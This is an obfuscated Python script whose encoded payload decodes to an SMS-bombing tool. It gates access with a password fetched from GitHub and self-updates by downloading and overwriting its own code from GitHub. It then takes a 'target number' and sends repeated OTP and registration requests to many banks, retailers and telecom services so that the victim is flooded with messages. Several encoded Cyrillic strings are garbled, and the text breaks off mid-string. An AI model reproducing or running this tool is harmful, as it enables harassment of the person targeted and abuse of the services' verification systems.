# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = 'aW1wb3J0IHJlcXVlc3RzLCByYW5kb20sIGRhdGV0aW1lLCBzeXMsIHRpbWUsIGFyZ3BhcnNlLCBvcwpmcm9tIGNvbG9yYW1hIGltcG9ydCBpbml0LCBGb3JlLCBCYWNrLCBTdHlsZQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCmltcG9ydCB1cmxsaWIucmVxdWVzdAppbml0KCkKcHJpbnQoIklmIHUgZG9udCBrbm93IGxvZ2luIHBhc3N3b3JkIGNvbWUgb3VyIHRlbGVncmFtIGdyb3VwIHwgIikKcHJpbnQoInQubWUvNG5hdHJlYm9ybiAiKQpwcmludCgiIikKcHJpbnQoInQubWUvaWNoYmluaGFydW4iKQpwcmludCAoIiIpCgp1c2VyID0gaW5wdXQoIiAgICAgICAgJ0VudGVyJyBUbyBDb250aXVuZSEhISIpCmlmIHVzZXIgPT0gIiI6b3Muc3lzdGVtKCdjbGVhcicpCnVzZXIgPWlucHV0KCdVc2VybmFtZSA6ICAnKQpwYXNzd2QgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKAoiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzRuYXQvcmVhZGVyL21hc3Rlci9wYXNzLnR4dCIpLnJlYWQoKQpucGFzc3dkPWludChiYXNlNjQuYjY0ZGVjb2RlKHBhc3N3ZCkpCnVwYXNzd2QgPWludChpbnB1dCgnUGFzc3dvcmQgOiAgJykpCm9zLnN5c3RlbSgnY2xlYXInKQp0aW1lLnNsZWVwKDEpCnByaW50KCJjaGVja2luZyB5b3VyIHVzZXJuYW1lLi4uIikKdGltZS5zbGVlcCgxKQpvcy5zeXN0ZW0oJ2NsZWFyJykKcHJpbnQoInJlYWRpbmcgZGF0YWJhc2UuIikKdGltZS5zbGVlcCgyKQpvcy5zeXN0ZW0oJ2NsZWFyJykKcHJpbnQoInJlYWRpbmcgZGF0YWJhc2UuLiIpCnRpbWUuc2xlZXAoMSkKb3Muc3lzdGVtKCdjbGVhcicpCnByaW50KCJyZWFkaW5nIGRhdGFiYXNlLi4uIikKdGltZS5zbGVlcCgxKQppZiB1c2VyPT0icmVib3JuIiBhbmQgdXBhc3N3ZD09bnBhc3N3ZDpvcy5zeXN0ZW0oJ2NsZWFyJyk7cHJpbnQoIkxvZ2luIFN1Y2Nlc3MhLi4iKTtvcy5zeXN0ZW0oImVjaG8gZnVjayBzb2NpZXR5ID4uNG5hdCIpCmVsaWYgdXNlcj09InJlYm9ybiI6IG9zLnN5c3RlbSgnY2xlYXInKTtwcmludCgiSW5jb3JyZWN0IFBhc3N3b3JkISAgPiAgRXJyb3IgQ29kZSA6IDEwMSIpO3N5cy5leGl0KCkKZWxpZiB1c2VyIT0icmVib3JuIiBhbmQgcGFzc3dkPT0iMjM1NDY3Ijogb3Muc3lzdGVtKCdjbGVhcicpO3ByaW50KCJJbmNvcnJlY3QgVXNlcm5hbWUhICA+ICBFcnJvciBDb2RlIDogMTAyIik7c3lzLmV4aXQoKQplbGlmIHVzZXI9PSIiIGFuZCBwYXNzd2Q9PSIiOiBvcy5zeXN0ZW0oJ2NsZWFyJyk7cHJpbnQoIlBsZWFzZSBXcml0ZSBVc2VybmFtZSBhbmQgUGFzc3dvcmQhID4gIEVycm9yIENvZGUgOiAxMDMgIik7c3lzLmV4aXQoKQplbHNlOiAgb3Muc3lzdGVtKCdjbGVhcicpOyBwcmludCgiSW5jb3JyZWN0IFVzZXJuYW1lIGFuZCBQYXNzd29yZCEgPiAgRXJyb3IgQ29kZSA6MTAzIik7cHJpbnQoIiIpO3ByaW50KCJQbGVhc2UgQ29udGFjdCBEZXZlbHBlci4iKTtwcmludCgidC5tZS9pY2hiaW5oYXJ1biIpCnRyeToKICAgIGYgPSBvcGVuKCIuNG5hdCIpCiAgICBwcmludCgiTG9naW4gU3VjY2VzcyEiKQpleGNlcHQgSU9FcnJvcjoKICAgIHByaW50KCJQbGVhc2UgTG9naW4iKQogICAgc3lzLmV4aXQoKQpmaW5hbGx5OgogICAgZi5jbG9zZSgpCgpwcmludChGb3JlLkdSRUVOICsgQmFjay5CTEFDSyArIFN0eWxlLkJSSUdIVCArICcnJwogICBfX18gIF8gICBfICAgX19fIF9fX19fIAogIC8gICB8fCBcIHwgfCAvIF8gXF8gICBffAogLyAvfCB8fCAgXHwgfC8gL19cIFx8IHwgIAovIC9ffCB8fCAuIGAgfHwgIF8gIHx8IHwgIApcX19fICB8fCB8XCAgfHwgfCB8IHx8IHwgIAogICAgfF8vXF98IFxfL1xffCB8Xy9cXy8gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCicnJyArIFN0eWxlLlJFU0VUX0FMTCkKCgpkZWYgc2h1dGRvd24oc2lnbmFsLCBmcmFtZSk6CiAgICBwcmludCAoJ1xuXDAzM1sxOzMxbUN0cmwrQyB3YXMgcHJlc3NlZCwgc2h1dHRpbmcgZG93biFcMDMzWzBtJykKICAgIHN5cy5leGl0KCkKCmRlZiBjaGVja2ludGVybmV0KCk6CiAgICByZXMgPSBGYWxzZQogICAgdHJ5OgogICAgICAgIHJlcXVlc3RzLmdldCgnaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbScsIHZlcmlmeT1UcnVlKQogICAgICAgIHJlcyA9IEZhbHNlCiAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgIHJlcyA9IFRydWUKICAgIGlmIHJlczoKICAgICAgICBwcmludCgiXG5cblx0SXQgc2VlbXMgVGhhdCBZb3VyIEludGVybmV0IFNwZWVkIGlzIFNsb3cgb3IgWW91IEFyZSBVc2luZyBQcm94aWVzLi4iKQogICAgICAgIGV4aXQoKQpkZWYgdXBkYXRlKCk6CiAgICBzdHVmZl90b191cGRhdGUgPSBbJ3Ntcy5weScsICcudmVyc2lvbiddCiAgICBmb3IgZmwgaW4gc3R1ZmZfdG9fdXBkYXRlOgogICAgICAgIGRhdCA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oCiAgICAgICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNG5hdC9SZWJvcm4vbWFzdGVyLyIgKyBmbCkucmVhZCgpCiAgICAgICAgZmlsZSA9IG9wZW4oZmwsICd3YicpCiAgICAgICAgZmlsZS53cml0ZShkYXQpCiAgICAgICAgZmlsZS5jbG9zZSgpCiAgICBwcmludCgnXG5cdFx0VXBkYXRlZCBTdWNjZXNzZnVsbCAhISEhJykKICAgIHByaW50KCdcdFBsZWFzZSBSdW4gVGhlIFNjcmlwdCBBZ2Fpbi4uLicpCiAgICBleGl0KCkKCnRyeToKICAgIHVybGxpYi5yZXF1ZXN0LnVybG9wZW4oJ2h0dHBzOi8vd3d3Lmdvb2dsZS5jb20nKQpleGNlcHQgRXhjZXB0aW9uOgogICAgcHJpbnQoIllvdSBhcmUgbm90IGNvbm5lY3RlZCBUbyBJbnRlcm5ldCEhISIpCiAgICBwcmludCgiXHRQbGVhc2UgQ29ubmVjdCBUbyBJbnRlcm5ldCBUbyBDb250aW51ZS4uLlxuIikKICAgIGlucHV0KCdFeGl0aW5nLi4uLlxuIFByZXNzIEVudGVyIFRvIENvbnRpbnVlLi4uLicpCiAgICBleGl0KCkKcHJpbnQoJ1x0Q2hlY2tpbmcgRm9yIFVwZGF0ZXMuLi4nKQp2ZXIgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKAogICAgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS80bmF0L1JlYm9ybi9tYXN0ZXIvLnZlcnNpb24iKS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpCnZlcmwgPSAnJwp0cnk6CiAgICB2ZXJsID0gb3BlbigiLnZlcnNpb24iLCAncicpLnJlYWQoKQpleGNlcHQgRXhjZXB0aW9uOgogICAgcGFzcwppZiB2ZXIgIT0gdmVybDoKICAgIHByaW50KCdcdFx0VXBkYXRlIGlzIEF2YWlsYWJsZS4uLi4nKQogICAgcHJpbnQoJ1x0U3RhcnRpbmcgVXBkYXRlLi4uJykKICAgIHVwZGF0ZSgpCnByaW50KCJZb3VyIFZlcnNpb24gaXMgVXAtVG8tRGF0ZSIpCnRyeToKICAgIG5vdGkgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKAogICAgICAgICJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNG5hdC9SZWJvcm4vbWFzdGVyLy5ub3RpZnkiKS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpCiAgICBub3RpID0gbm90aS51cHBlcigpLnN0cmlwKCkKICAgIGlmIGxlbihub3RpKSA+IDEwOgogICAgICAgIHByaW50KCdcblxuXHROT1RJRklDQVRJT046ICcgKyBub3RpICsgJ1xuXG4nKQoKZmlyc3QgPSBpbnB1dCAoIkVudGVyIFRhcmdldCBOdW1iZXIgLS0tPiIpCm9zLnN5c3RlbSgnY2xlYXInKQpudW0xID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbigKImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS80bmF0L3JlYWRlci9tYXN0ZXIvYS50eHQiKS5yZWFkKCkKcHJpbnQoIlNjYW5uaW5nIFZJUCBOdW1iZXJzLiIpCm9zLnN5c3RlbSgnY2xlYXInKQpwcmludCgiU2Nhbm5pbmcgVklQIE51bWJlcnMuLiIpCm9zLnN5c3RlbSgnY2xlYXInKQpwcmludCgiU2Nhbm5pbmcgVklQIE51bWJlcnMuLi4iKQp0aW1lLnNsZWVwKDEpCm51bTIgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vNG5hdC9yZWFkZXIvbWFzdGVyL2IudHh0IikucmVhZCgpCmRlY29kZT1wcmludCgiRGVjb2RpbmcuLi4uIikKdGltZS5zbGVlcCgxKQp0ZXN0MT1pbnQoYmFzZTY0LmI2NGRlY29kZShudW0xKSkKcHJpbnQoIlJlYWRpbmcuLi4uLi4iKQp0ZXN0Mj1pbnQoYmFzZTY0LmI2NGRlY29kZShudW0yKSkKaWYgaW50KGZpcnN0KT09dGVzdDE6cHJpbnQoIlRoaXMgTnVtYmVyIFByb3RlY3RpbmcuLi4iKTtleGl0KCkKZWxpZiBpbnQoZmlyc3QpPT10ZXN0MjpwcmludCgiVGhpcyBOdW1iZXIgUHJvdGVjdGluZy4uLiIpO2V4aXQoKQplbHNlOm9zLnN5c3RlbSgnY2xlYXInKQpfcGhvbmUgPSBpbnB1dCgiRW50ZXIgVGFyZ2V0IE51bWJlciBBZ2Fpbi0tLT4iKQpvcy5zeXN0ZW0oJ2NsZWFyJykKdGltZS5zbGVlcCgyKQpfcGhvbmUgPSBpbnB1dCgnRW50ZXIgVGFyZ2V0IE51bWJlciAtLT4gJykKIAoKX25hbWUgPSAnJwpmb3IgeCBpbiByYW5nZSgxMik6Cglf'
love = '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'
god = 'b24gcmVnaXN0cmF0aW9uKCRjbGllbnQ6IENsaWVudElucHV0ISkgeycnXG4gIHJlZ2lzdHJhdGlvbihjbGllbnQ6ICRjbGllbnQpIHsnJ1xuICAgIHRva2VuXG4gICAgX190eXBlbmFtZVxuICB9XG59XG4nfSkKCQlwcmludCgnWytdIG5ld25leHQgUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZXB0OgoJCXByaW50KCdbLV0gbmV3bmV4dCBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hcGkuc3VubGlnaHQubmV0L3YzL2N1c3RvbWVycy9hdXRob3JpemF0aW9uLycsIGRhdGE9eydwaG9uZSc6IF9waG9uZX0pCgkJcHJpbnQoJ1srXSBTdW5saWdodCBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBTdW5saWdodCBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9hbHBhcmkuY29tL2FwaS9ydS9wcm90ZWN0aW9uL2RlbGl2ZXIvMmYxNzhiMTc5OTBjYTRiNzkwM2FhODM0YjlmNTRjMmMwYmNiMDFhMi8nLCBqc29uPXsnY2xpZW50X3R5cGUnOiAncGVyc29uYWwnLCAnZW1haWwnOiBfZW1haWwsICdtb2JpbGVfcGhvbmUnOiBfcGhvbmUsICdkZWxpdmVyeU9wdGlvbic6ICdzbXMnfSkKCQlwcmludCgnWytdIGFscGFyaSBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBhbHBhcmkgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vbGsuaW52aXRyby5ydS9sazIvbGthL3BhdGllbnQvcmVmcmVzaENvZGUnLCBkYXRhPXsncGhvbmUnOiBfcGhvbmV9KQoJCXByaW50KCdbK10gSW52aXRybyBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBJbnZpdHJvIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL29ubGluZS5zYmlzLnJ1L3JlZy9zZXJ2aWNlLycsIGpzb249eydqc29ucnBjJzonMi4wJywncHJvdG9jb2wnOic1JywnbWV0aG9kJzonw4PCg8OCwpDDg8KCw4LCn8ODwoPDgsKQw4PCgsOCwr7Dg8KDw4LCkMODwoLDgsK7w4PCg8OCwpHDg8KCw4LCjMODwoPDgsKQw4PCgsOCwrfDg8KDw4LCkMODwoLDgsK+w4PCg8OCwpDDg8KCw4LCssODwoPDgsKQw4PCgsOCwrDDg8KDw4LCkcODwoLDgsKCw4PCg8OCwpDDg8KCw4LCtcODwoPDgsKQw4PCgsOCwrvDg8KDw4LCkcODwoLDgsKMLsODwoPDgsKQw4PCgsOCwpfDg8KDw4LCkMODwoLDgsKww4PCg8OCwpHDg8KCw4LCj8ODwoPDgsKQw4PCgsOCwrLDg8KDw4LCkMODwoLDgsK6w4PCg8OCwpDDg8KCw4LCsMODwoPDgsKQw4PCgsOCwp3Dg8KDw4LCkMODwoLDgsKww4PCg8OCwpDDg8KCw4LCpMODwoPDgsKQw4PCgsOCwrjDg8KDw4LCkMODwoLDgsK3w4PCg8OCwpDDg8KCw4LCuMODwoPDgsKQw4PCgsOCwrrDg8KDw4LCkMODwoLDgsKwJywncGFyYW1zJzp7J3Bob25lJzpfcGhvbmV9LCdpZCc6JzEnfSkKCQlwcmludCgnWytdIFNiZXJiYW5rIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIFNiZXJiYW5rIFJlcXVlc3RzIEZhaWxlZCEnKQoKCXRyeToKCQlyZXF1ZXN0cy5wb3N0KCdodHRwczovL2liLnBzYmFuay5ydS9hcGkvYXV0aGVudGljYXRpb24vZXh0ZW5kZWRDbGllbnRBdXRoUmVxdWVzdCcsIGpzb249eydmaXJzdE5hbWUnOifDg8KDw4LCkMODwoLDgsKYw4PCg8OCwpDDg8KCw4LCssODwoPDgsKQw4PCgsOCwrDDg8KDw4LCkMODwoLDgsK9JywnbWlkZGxlTmFtZSc6J8ODwoPDgsKQw4PCgsOCwpjDg8KDw4LCkMODwoLDgsKyw4PCg8OCwpDDg8KCw4LCsMODwoPDgsKQw4PCgsOCwr3Dg8KDw4LCkMODwoLDgsK+w4PCg8OCwpDDg8KCw4LCssODwoPDgsKQw4PCgsOCwrjDg8KDw4LCkcODwoLDgsKHJywnbGFzdE5hbWUnOifDg8KDw4LCkMODwoLDgsKYw4PCg8OCwpDDg8KCw4LCssODwoPDgsKQw4PCgsOCwrDDg8KDw4LCkMODwoLDgsK9w4PCg8OCwpDDg8KCw4LCvsODwoPDgsKQw4PCgsOCwrInLCdzZXgnOicxJywnYmlydGhEYXRlJzonMTAuMTAuMjAwMCcsJ21vYmlsZVBob25lJzogX3Bob25lOSwncnVzc2lhbkZlZGVyYXRpb25SZXNpZGVudCc6J3RydWUnLCdpc0RTQSc6J2ZhbHNlJywncGVyc29uYWxEYXRhUHJvY2Vzc2luZ0FncmVlbWVudCc6J3RydWUnLCdiS0lSZXF1ZXN0QWdyZWVtZW50JzonbnVsbCcsJ3Byb21vdGlvbkFncmVlbWVudCc6J3RydWUnfSkKCQlwcmludCgnWytdIFBzYmFuayBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBQc2JhbmsgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vbXlhcGkuYmVsdGVsZWNvbS5ieS9hcGkvdjEvYXV0aC9jaGVjay1waG9uZT9sYW5nPXJ1JywgZGF0YT17J3Bob25lJzogX3Bob25lfSkKCQlwcmludCgnWytdIEJlbHRlbGNvbSBSZXF1ZXN0cyBTdWNjZXNzZnVsIScpCglleGNlcHQ6CgkJcHJpbnQoJ1stXSBCZWx0ZWxjb20gUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXBwLmthcnVzZWwucnUvYXBpL3YxL3Bob25lLycsIGRhdGE9eydwaG9uZSc6IF9waG9uZX0pCgkJcHJpbnQoJ1srXSBLYXJ1c2VsIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIEthcnVzZWwgUmVxdWVzdHMgRmFpbGVkIScpCgoJdHJ5OgoJCXJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXBwLWFwaS5rZmMucnUvYXBpL3YxL2NvbW1vbi9hdXRoL3NlbmQtdmFsaWRhdGlvbi1zbXMnLCBqc29uPXsncGhvbmUnOiAnKycgKyBfcGhvbmV9KQoJCXByaW50KCdbK10gS0ZDIFJlcXVlc3RzIFN1Y2Nlc3NmdWwhJykKCWV4Y2VwdDoKCQlwcmludCgnWy1dIEtGQyBSZXF1ZXN0cyBGYWlsZWQhJykKCgl0cnk6CgkJcmVxdWVzdHMucG9zdCgiaHR0cHM6Ly9hcGkuY2Fyc21pbGUuY29tLyIsanNvbj17Im9wZXJhdGlvbk5hbWUiOiAiZW50ZXJQaG9uZSIsICJ2YXJpYWJsZXMiOiB7InBob25lIjogX3Bob25lfSwicXVlcnkiOiAibXV0YXRpb24gZW5